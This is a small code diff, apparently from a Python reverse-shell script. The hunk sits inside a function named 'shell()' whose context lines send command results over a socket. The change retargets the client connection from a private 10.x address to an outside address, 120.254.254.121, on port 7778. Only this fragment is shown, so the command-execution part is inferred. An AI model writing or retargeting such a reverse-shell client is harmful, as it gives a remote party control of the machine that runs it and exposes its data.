@@ -26,5 +26,5 @@ def shell():
                 client.send(result)
 
 client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-client.connect(("10.254.254.111",7778))
+client.connect(("120.254.254.121",7778))
 client.close()
